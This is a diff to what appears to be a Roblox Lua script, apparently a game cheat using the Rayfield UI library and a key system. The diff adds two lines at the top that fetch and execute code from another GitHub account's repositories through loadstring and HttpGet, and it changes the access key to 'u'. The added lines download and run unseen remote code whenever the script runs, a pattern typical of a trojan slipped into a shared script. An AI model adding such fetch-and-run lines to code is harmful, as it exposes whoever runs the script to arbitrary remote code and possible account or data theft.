@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lostbunny489/gator/main/Semen", true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lostbunny489/reset-/main/Code", true))()
+
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
 
 local player = game.Players.LocalPlayer
@@ -24,7 +28,7 @@ KeySettings = {
    FileName = "SiriusKey",
    SaveKey = true,
    GrabKeyFromSite = false,
-   Key = "WeTheBest"
+   Key = "u"
    }
 })
 
